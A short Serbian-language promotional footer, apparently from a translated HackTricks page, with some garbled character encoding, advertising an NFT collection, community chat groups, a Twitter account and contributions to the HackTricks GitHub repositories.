* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
